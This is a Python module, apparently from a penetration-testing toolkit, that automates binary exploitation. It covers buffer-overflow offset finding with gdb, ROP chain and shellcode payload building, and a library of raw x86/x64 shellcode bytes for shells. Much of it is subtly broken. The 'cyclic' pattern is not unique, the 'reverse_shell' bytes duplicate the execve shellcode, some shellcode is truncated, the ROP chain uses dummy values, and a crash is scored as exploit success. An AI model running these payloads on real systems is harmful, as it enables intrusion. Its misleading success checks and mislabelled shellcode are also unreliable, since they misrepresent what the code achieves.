"""
Pentest-USB Toolkit - Binary Exploitation Module
===============================================

Binary exploitation techniques including buffer overflow exploitation,
ROP chain generation, binary analysis integration, and exploit development tools.

Author: Pentest-USB Development Team
Version: 1.0.0
"""

import re
import os
import time
import struct
import subprocess
from typing import Dict, List, Any, Optional, Tuple, Union
from pathlib import Path
import tempfile
import shutil

from ...core.utils.logging_handler import get_logger
from ...core.utils.error_handler import PentestError
from ...core.security.consent_manager import ConsentManager
from ...core.utils.file_ops import FileOperations


class BinaryExploitationEngine:
    """
    Binary exploitation engine for buffer overflows, ROP chains, and binary analysis
    """
    
    def __init__(self):
        """Initialize Binary Exploitation Engine"""
        self.logger = get_logger(__name__)
        self.consent_manager = ConsentManager()
        self.file_ops = FileOperations()
        
        # Tool paths
        self.gdb_path = self._find_tool_path('gdb')
        self.objdump_path = self._find_tool_path('objdump')
        self.readelf_path = self._find_tool_path('readelf')
        self.ropper_path = self._find_tool_path('ropper')
        self.checksec_path = self._find_tool_path('checksec')
        
        # Working directories
        self.work_dir = Path("/app/outputs/exploits/binary")
        self.file_ops.ensure_directory(self.work_dir)
        
        # Exploit patterns and payloads
        self.pattern_generator = PatternGenerator()
        self.shellcode_library = ShellcodeLibrary()
        
        self.logger.info("BinaryExploitationEngine initialized")
    
    def _find_tool_path(self, tool_name: str) -> Optional[str]:
        """Find tool path in binaries directory or system PATH"""
        try:
            import platform
            system = platform.system().lower()
            
            # Check binaries directory
            tool_dir = Path(f"/app/tools/binaries/{system}")
            if system == "windows":
                tool_path = tool_dir / f"{tool_name}.exe"
            else:
                tool_path = tool_dir / tool_name
            
            if tool_path.exists():
                return str(tool_path)
            
            # Check system PATH
            try:
                result = subprocess.run(['which', tool_name], capture_output=True, text=True)
                if result.returncode == 0:
                    return result.stdout.strip()
            except:
                pass
                
            self.logger.warning(f"Tool not found: {tool_name}")
            return None
            
        except Exception as e:
            self.logger.error(f"Error finding tool {tool_name}: {str(e)}")
            return None
    
    def analyze_binary(self, binary_path: str) -> Dict[str, Any]:
        """
        Comprehensive binary analysis
        
        Args:
            binary_path: Path to binary file
            
        Returns:
            Analysis results including vulnerabilities and exploitation vectors
        """
        try:
            self.logger.info(f"Analyzing binary: {binary_path}")
            
            if not os.path.exists(binary_path):
                raise PentestError(f"Binary file not found: {binary_path}")
            
            # Basic file analysis
            file_info = self._analyze_file_properties(binary_path)
            
            # Security features analysis
            security_features = self._analyze_security_features(binary_path)
            
            # Function analysis
            function_analysis = self._analyze_functions(binary_path)
            
            # Vulnerability discovery
            vulnerabilities = self._discover_vulnerabilities(binary_path)
            
            # ROP gadget analysis
            rop_gadgets = self._find_rop_gadgets(binary_path)
            
            analysis_result = {
                'binary_path': binary_path,
                'file_info': file_info,
                'security_features': security_features,
                'function_analysis': function_analysis,
                'vulnerabilities': vulnerabilities,
                'rop_gadgets': rop_gadgets,
                'exploitation_difficulty': self._assess_exploitation_difficulty(security_features, vulnerabilities),
                'recommended_techniques': self._recommend_techniques(security_features, vulnerabilities)
            }
            
            self.logger.info("Binary analysis completed")
            return analysis_result
            
        except Exception as e:
            self.logger.error(f"Binary analysis failed: {str(e)}")
            raise PentestError(f"Binary analysis failed: {str(e)}")
    
    def exploit_buffer_overflow(self, binary_path: str, vulnerability_info: Dict[str, Any]) -> Dict[str, Any]:
        """
        Exploit buffer overflow vulnerability
        
        Args:
            binary_path: Path to vulnerable binary
            vulnerability_info: Information about the vulnerability
            
        Returns:
            Exploitation results
        """
        try:
            self.logger.info("Attempting buffer overflow exploitation")
            
            # Analyze binary security features
            security_features = self._analyze_security_features(binary_path)
            
            # Determine exploitation strategy
            if security_features.get('nx', False):
                return self._exploit_with_rop(binary_path, vulnerability_info, security_features)
            else:
                return self._exploit_with_shellcode(binary_path, vulnerability_info, security_features)
                
        except Exception as e:
            self.logger.error(f"Buffer overflow exploitation failed: {str(e)}")
            return {
                'success': False,
                'error': str(e),
                'method': 'buffer_overflow'
            }
    
    def _exploit_with_shellcode(self, binary_path: str, vulnerability_info: Dict[str, Any], 
                               security_features: Dict[str, Any]) -> Dict[str, Any]:
        """Exploit using direct shellcode injection"""
        self.logger.info("Exploiting with shellcode injection")
        
        try:
            # Find buffer overflow offset
            offset = self._find_buffer_offset(binary_path, vulnerability_info)
            if not offset:
                return {'success': False, 'error': 'Could not determine buffer offset'}
            
            # Generate shellcode
            shellcode = self._generate_shellcode(vulnerability_info.get('target_arch', 'x86'))
            
            # Build exploit payload
            payload = self._build_shellcode_payload(offset, shellcode, security_features)
            
            # Test exploit
            exploit_result = self._test_exploit(binary_path, payload, vulnerability_info)
            
            return {
                'success': exploit_result.get('success', False),
                'method': 'shellcode_injection',
                'offset': offset,
                'shellcode_size': len(shellcode),
                'payload_size': len(payload),
                'exploit_result': exploit_result,
                'payload': payload.hex() if isinstance(payload, bytes) else payload
            }
            
        except Exception as e:
            return {'success': False, 'error': str(e), 'method': 'shellcode_injection'}
    
    def _exploit_with_rop(self, binary_path: str, vulnerability_info: Dict[str, Any],
                         security_features: Dict[str, Any]) -> Dict[str, Any]:
        """Exploit using ROP (Return-Oriented Programming)"""
        self.logger.info("Exploiting with ROP chain")
        
        try:
            # Find buffer overflow offset
            offset = self._find_buffer_offset(binary_path, vulnerability_info)
            if not offset:
                return {'success': False, 'error': 'Could not determine buffer offset'}
            
            # Find ROP gadgets
            rop_gadgets = self._find_rop_gadgets(binary_path)
            if not rop_gadgets:
                return {'success': False, 'error': 'Insufficient ROP gadgets found'}
            
            # Build ROP chain
            rop_chain = self._build_rop_chain(rop_gadgets, vulnerability_info)
            if not rop_chain:
                return {'success': False, 'error': 'Could not build viable ROP chain'}
            
            # Generate shellcode for ROP
            shellcode = self._generate_shellcode(vulnerability_info.get('target_arch', 'x86'))
            
            # Build complete exploit payload
            payload = self._build_rop_payload(offset, rop_chain, shellcode, security_features)
            
            # Test exploit
            exploit_result = self._test_exploit(binary_path, payload, vulnerability_info)
            
            return {
                'success': exploit_result.get('success', False),
                'method': 'rop_chain',
                'offset': offset,
                'rop_gadgets_used': len(rop_chain),
                'rop_chain': [hex(addr) for addr in rop_chain],
                'payload_size': len(payload),
                'exploit_result': exploit_result
            }
            
        except Exception as e:
            return {'success': False, 'error': str(e), 'method': 'rop_chain'}
    
    def _analyze_file_properties(self, binary_path: str) -> Dict[str, Any]:
        """Analyze basic file properties"""
        try:
            file_info = {}
            
            # Get file size
            file_info['size'] = os.path.getsize(binary_path)
            
            # Use file command for type detection
            try:
                result = subprocess.run(['file', binary_path], capture_output=True, text=True)
                file_info['file_type'] = result.stdout.strip()
            except:
                file_info['file_type'] = 'unknown'
            
            # Use readelf for ELF analysis
            if self.readelf_path:
                try:
                    result = subprocess.run([self.readelf_path, '-h', binary_path], 
                                          capture_output=True, text=True)
                    file_info['elf_header'] = self._parse_elf_header(result.stdout)
                except:
                    file_info['elf_header'] = {}
            
            return file_info
            
        except Exception as e:
            self.logger.error(f"File analysis failed: {str(e)}")
            return {'error': str(e)}
    
    def _analyze_security_features(self, binary_path: str) -> Dict[str, Any]:
        """Analyze binary security features"""
        try:
            security_features = {
                'nx': False,
                'stack_canary': False,
                'aslr': False,
                'pie': False,
                'relro': False,
                'fortify': False
            }
            
            # Use checksec if available
            if self.checksec_path:
                try:
                    result = subprocess.run([self.checksec_path, '--file', binary_path],
                                          capture_output=True, text=True)
                    security_features.update(self._parse_checksec_output(result.stdout))
                except Exception as e:
                    self.logger.debug(f"Checksec failed: {str(e)}")
            
            # Manual checks using readelf
            if self.readelf_path:
                try:
                    # Check for stack canaries
                    result = subprocess.run([self.readelf_path, '-s', binary_path],
                                          capture_output=True, text=True)
                    if '__stack_chk_fail' in result.stdout:
                        security_features['stack_canary'] = True
                    
                    # Check for PIE
                    result = subprocess.run([self.readelf_path, '-h', binary_path],
                                          capture_output=True, text=True)
                    if 'DYN' in result.stdout:
                        security_features['pie'] = True
                        
                except Exception as e:
                    self.logger.debug(f"Manual security check failed: {str(e)}")
            
            return security_features
            
        except Exception as e:
            self.logger.error(f"Security feature analysis failed: {str(e)}")
            return {'error': str(e)}
    
    def _analyze_functions(self, binary_path: str) -> Dict[str, Any]:
        """Analyze binary functions for vulnerabilities"""
        try:
            function_analysis = {
                'dangerous_functions': [],
                'function_count': 0,
                'entry_points': [],
                'imported_functions': []
            }
            
            # Dangerous function patterns
            dangerous_functions = [
                'strcpy', 'strcat', 'sprintf', 'vsprintf', 'gets', 'scanf',
                'strncpy', 'strncat', 'snprintf', 'vsnprintf'
            ]
            
            # Use objdump to disassemble
            if self.objdump_path:
                try:
                    result = subprocess.run([self.objdump_path, '-t', binary_path],
                                          capture_output=True, text=True)
                    
                    # Parse symbols
                    for line in result.stdout.split('\n'):
                        for func in dangerous_functions:
                            if func in line and 'UND' in line:
                                function_analysis['dangerous_functions'].append(func)
                                
                except Exception as e:
                    self.logger.debug(f"Function analysis failed: {str(e)}")
            
            return function_analysis
            
        except Exception as e:
            self.logger.error(f"Function analysis failed: {str(e)}")
            return {'error': str(e)}
    
    def _discover_vulnerabilities(self, binary_path: str) -> List[Dict[str, Any]]:
        """Discover potential vulnerabilities in binary"""
        try:
            vulnerabilities = []
            
            # Static analysis for common vulnerability patterns
            function_analysis = self._analyze_functions(binary_path)
            
            # Check for dangerous functions
            for func in function_analysis.get('dangerous_functions', []):
                vulnerabilities.append({
                    'type': 'buffer_overflow',
                    'function': func,
                    'severity': 'high',
                    'description': f'Use of dangerous function {func} may lead to buffer overflow'
                })
            
            # Check for format string vulnerabilities
            if self._check_format_string_vulns(binary_path):
                vulnerabilities.append({
                    'type': 'format_string',
                    'severity': 'high',
                    'description': 'Potential format string vulnerability detected'
                })
            
            # Check for integer overflow possibilities
            if self._check_integer_overflows(binary_path):
                vulnerabilities.append({
                    'type': 'integer_overflow',
                    'severity': 'medium',
                    'description': 'Potential integer overflow vulnerability detected'
                })
            
            return vulnerabilities
            
        except Exception as e:
            self.logger.error(f"Vulnerability discovery failed: {str(e)}")
            return []
    
    def _find_rop_gadgets(self, binary_path: str) -> List[Dict[str, Any]]:
        """Find ROP gadgets in binary"""
        try:
            gadgets = []
            
            # Use ropper if available
            if self.ropper_path:
                try:
                    result = subprocess.run([
                        self.ropper_path, '--file', binary_path, '--search', '%',
                        '--quality', '1'
                    ], capture_output=True, text=True, timeout=60)
                    
                    gadgets = self._parse_ropper_output(result.stdout)
                    
                except subprocess.TimeoutExpired:
                    self.logger.warning("ROP gadget search timed out")
                except Exception as e:
                    self.logger.debug(f"Ropper failed: {str(e)}")
            
            # Manual gadget search using objdump
            if not gadgets and self.objdump_path:
                gadgets = self._manual_gadget_search(binary_path)
            
            return gadgets
            
        except Exception as e:
            self.logger.error(f"ROP gadget search failed: {str(e)}")
            return []
    
    def _find_buffer_offset(self, binary_path: str, vulnerability_info: Dict[str, Any]) -> Optional[int]:
        """Find buffer overflow offset using pattern matching"""
        try:
            self.logger.info("Finding buffer overflow offset")
            
            # Generate unique pattern
            pattern = self.pattern_generator.generate_pattern(1000)
            
            # Create test input file
            test_input = self.work_dir / f"test_input_{int(time.time())}.txt"
            with open(test_input, 'wb') as f:
                f.write(pattern)
            
            # Run binary with pattern input
            try:
                with tempfile.NamedTemporaryFile(mode='w', delete=False) as gdb_script:
                    gdb_script.write(f"""
                    set confirm off
                    set pagination off
                    run < {test_input}
                    info registers
                    quit
                    """)
                    gdb_script_path = gdb_script.name
                
                if self.gdb_path:
                    result = subprocess.run([
                        self.gdb_path, '-batch', '-x', gdb_script_path, binary_path
                    ], capture_output=True, text=True, timeout=30)
                    
                    # Parse crash information
                    offset = self._parse_crash_offset(result.stdout, pattern)
                    
                    # Clean up
                    os.unlink(gdb_script_path)
                    
                    return offset
                    
            except subprocess.TimeoutExpired:
                self.logger.warning("Buffer offset detection timed out")
                return None
            finally:
                if test_input.exists():
                    test_input.unlink()
            
            return None
            
        except Exception as e:
            self.logger.error(f"Buffer offset detection failed: {str(e)}")
            return None
    
    def _generate_shellcode(self, arch: str = 'x86') -> bytes:
        """Generate shellcode for target architecture"""
        return self.shellcode_library.get_shellcode('reverse_shell', arch)
    
    def _build_shellcode_payload(self, offset: int, shellcode: bytes, 
                               security_features: Dict[str, Any]) -> bytes:
        """Build exploit payload with shellcode"""
        try:
            # Build payload: padding + return address + shellcode
            padding = b'A' * offset
            
            # Choose return address (simplified)
            if security_features.get('aslr', False):
                # ASLR bypass would be needed
                return_addr = struct.pack('<I', 0x41414141)  # Placeholder
            else:
                # Use stack address (simplified)
                return_addr = struct.pack('<I', 0xbffff000)  # Common stack address
            
            payload = padding + return_addr + shellcode
            
            return payload
            
        except Exception as e:
            self.logger.error(f"Payload building failed: {str(e)}")
            return b''
    
    def _build_rop_chain(self, rop_gadgets: List[Dict[str, Any]], 
                        vulnerability_info: Dict[str, Any]) -> List[int]:
        """Build ROP chain for exploitation"""
        try:
            rop_chain = []
            
            # Simplified ROP chain building
            # In a real implementation, this would be much more sophisticated
            
            # Look for useful gadgets
            pop_gadgets = [g for g in rop_gadgets if 'pop' in g.get('instruction', '')]
            ret_gadgets = [g for g in rop_gadgets if g.get('instruction', '').strip() == 'ret']
            
            if pop_gadgets and ret_gadgets:
                # Simple chain: pop ; ret
                rop_chain.append(pop_gadgets[0]['address'])
                rop_chain.append(0x41414141)  # Dummy value
                rop_chain.append(ret_gadgets[0]['address'])
            
            return rop_chain
            
        except Exception as e:
            self.logger.error(f"ROP chain building failed: {str(e)}")
            return []
    
    def _build_rop_payload(self, offset: int, rop_chain: List[int], shellcode: bytes,
                          security_features: Dict[str, Any]) -> bytes:
        """Build ROP exploit payload"""
        try:
            payload = b'A' * offset
            
            # Add ROP chain
            for addr in rop_chain:
                payload += struct.pack('<I', addr)
            
            # Add shellcode
            payload += shellcode
            
            return payload
            
        except Exception as e:
            self.logger.error(f"ROP payload building failed: {str(e)}")
            return b''
    
    def _test_exploit(self, binary_path: str, payload: bytes, 
                     vulnerability_info: Dict[str, Any]) -> Dict[str, Any]:
        """Test exploit payload"""
        try:
            # Create payload file
            payload_file = self.work_dir / f"exploit_payload_{int(time.time())}.bin"
            with open(payload_file, 'wb') as f:
                f.write(payload)
            
            # Test with GDB (safe environment)
            if self.gdb_path:
                with tempfile.NamedTemporaryFile(mode='w', delete=False) as gdb_script:
                    gdb_script.write(f"""
                    set confirm off
                    set pagination off
                    run < {payload_file}
                    info registers
                    quit
                    """)
                    gdb_script_path = gdb_script.name
                
                result = subprocess.run([
                    self.gdb_path, '-batch', '-x', gdb_script_path, binary_path
                ], capture_output=True, text=True, timeout=30)
                
                # Analyze result
                success = self._analyze_exploit_result(result.stdout, result.stderr)
                
                # Clean up
                os.unlink(gdb_script_path)
                payload_file.unlink()
                
                return {
                    'success': success,
                    'output': result.stdout,
                    'errors': result.stderr
                }
            
            return {'success': False, 'error': 'GDB not available for testing'}
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def _assess_exploitation_difficulty(self, security_features: Dict[str, Any],
                                      vulnerabilities: List[Dict[str, Any]]) -> str:
        """Assess exploitation difficulty"""
        score = 0
        
        # Security features increase difficulty
        if security_features.get('nx', False):
            score += 2
        if security_features.get('stack_canary', False):
            score += 3
        if security_features.get('aslr', False):
            score += 2
        if security_features.get('pie', False):
            score += 2
        if security_features.get('relro', False):
            score += 1
        
        # Vulnerabilities decrease difficulty
        high_severity_vulns = [v for v in vulnerabilities if v.get('severity') == 'high']
        score -= len(high_severity_vulns)
        
        if score <= 1:
            return 'easy'
        elif score <= 4:
            return 'medium'
        elif score <= 7:
            return 'hard'
        else:
            return 'very_hard'
    
    def _recommend_techniques(self, security_features: Dict[str, Any],
                            vulnerabilities: List[Dict[str, Any]]) -> List[str]:
        """Recommend exploitation techniques"""
        techniques = []
        
        if security_features.get('nx', False):
            techniques.append('rop_chain')
            techniques.append('ret2libc')
        else:
            techniques.append('shellcode_injection')
        
        if security_features.get('stack_canary', False):
            techniques.append('canary_leak')
            techniques.append('canary_bypass')
        
        if security_features.get('aslr', False):
            techniques.append('aslr_bypass')
            techniques.append('information_leak')
        
        return techniques
    
    # Helper methods for parsing and analysis
    def _parse_elf_header(self, elf_output: str) -> Dict[str, Any]:
        """Parse ELF header output"""
        elf_info = {}
        try:
            lines = elf_output.split('\n')
            for line in lines:
                if 'Class:' in line:
                    elf_info['class'] = line.split('Class:')[1].strip()
                elif 'Machine:' in line:
                    elf_info['machine'] = line.split('Machine:')[1].strip()
                elif 'Entry point address:' in line:
                    elf_info['entry_point'] = line.split('Entry point address:')[1].strip()
        except:
            pass
        return elf_info
    
    def _parse_checksec_output(self, checksec_output: str) -> Dict[str, bool]:
        """Parse checksec output"""
        features = {}
        try:
            # Parse checksec format
            if 'NX enabled' in checksec_output:
                features['nx'] = True
            if 'Canary found' in checksec_output:
                features['stack_canary'] = True
            if 'PIE enabled' in checksec_output:
                features['pie'] = True
            if 'Full RELRO' in checksec_output:
                features['relro'] = True
        except:
            pass
        return features
    
    def _check_format_string_vulns(self, binary_path: str) -> bool:
        """Check for format string vulnerabilities"""
        # Placeholder implementation
        return False
    
    def _check_integer_overflows(self, binary_path: str) -> bool:
        """Check for integer overflow vulnerabilities"""
        # Placeholder implementation
        return False
    
    def _parse_ropper_output(self, ropper_output: str) -> List[Dict[str, Any]]:
        """Parse ropper output"""
        gadgets = []
        try:
            lines = ropper_output.split('\n')
            for line in lines:
                if ': ' in line and 'ret' in line.lower():
                    parts = line.split(': ')
                    if len(parts) >= 2:
                        addr = parts[0].strip()
                        instruction = parts[1].strip()
                        gadgets.append({
                            'address': int(addr, 16) if addr.startswith('0x') else 0,
                            'instruction': instruction
                        })
        except:
            pass
        return gadgets
    
    def _manual_gadget_search(self, binary_path: str) -> List[Dict[str, Any]]:
        """Manual ROP gadget search"""
        # Simplified manual search
        return []
    
    def _parse_crash_offset(self, gdb_output: str, pattern: bytes) -> Optional[int]:
        """Parse crash information to find offset"""
        try:
            # Look for overwritten registers
            if 'EIP' in gdb_output:
                eip_match = re.search(r'eip\s+0x([0-9a-fA-F]+)', gdb_output)
                if eip_match:
                    eip_value = int(eip_match.group(1), 16)
                    # Find pattern offset
                    return self.pattern_generator.find_offset(pattern, eip_value)
            
            if 'RIP' in gdb_output:
                rip_match = re.search(r'rip\s+0x([0-9a-fA-F]+)', gdb_output)
                if rip_match:
                    rip_value = int(rip_match.group(1), 16)
                    return self.pattern_generator.find_offset(pattern, rip_value)
        except:
            pass
        return None
    
    def _analyze_exploit_result(self, stdout: str, stderr: str) -> bool:
        """Analyze exploit test results"""
        # Look for signs of successful exploitation
        success_indicators = [
            'Program received signal SIGSEGV',
            'segmentation fault',
            'shell',
            'exploit success'
        ]
        
        combined_output = (stdout + stderr).lower()
        return any(indicator in combined_output for indicator in success_indicators)


class PatternGenerator:
    """Generate and analyze cyclic patterns for offset detection"""
    
    def __init__(self):
        self.charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    
    def generate_pattern(self, length: int) -> bytes:
        """Generate cyclic pattern"""
        pattern = b''
        for i in range(length):
            char_index = i % len(self.charset)
            pattern += self.charset[char_index].encode()
        return pattern
    
    def find_offset(self, pattern: bytes, value: int) -> Optional[int]:
        """Find offset in pattern"""
        try:
            # Convert value to bytes and find in pattern
            value_bytes = struct.pack('<I', value)
            return pattern.find(value_bytes)
        except:
            return None


class ShellcodeLibrary:
    """Library of shellcode for different architectures and purposes"""
    
    def __init__(self):
        self.shellcodes = {
            'x86': {
                'reverse_shell': b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80',
                'bind_shell': b'\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x51\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xcd\x80',
                'execve_sh': b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
            },
            'x64': {
                'reverse_shell': b'\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05',
                'execve_sh': b'\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05'
            }
        }
    
    def get_shellcode(self, shellcode_type: str, arch: str) -> bytes:
        """Get shellcode for specific type and architecture"""
        return self.shellcodes.get(arch, {}).get(shellcode_type, b'')


# Module-level functions for easy integration
def analyze_binary(binary_path: str) -> Dict[str, Any]:
    """
    Analyze binary for vulnerabilities and exploitation opportunities
    
    Args:
        binary_path: Path to binary file
        
    Returns:
        Analysis results
    """
    engine = BinaryExploitationEngine()
    return engine.analyze_binary(binary_path)


def exploit_buffer_overflow(binary_path: str, vulnerability_info: Dict[str, Any]) -> Dict[str, Any]:
    """
    Exploit buffer overflow vulnerability in binary
    
    Args:
        binary_path: Path to vulnerable binary
        vulnerability_info: Vulnerability information
        
    Returns:
        Exploitation results
    """
    engine = BinaryExploitationEngine()
    return engine.exploit_buffer_overflow(binary_path, vulnerability_info)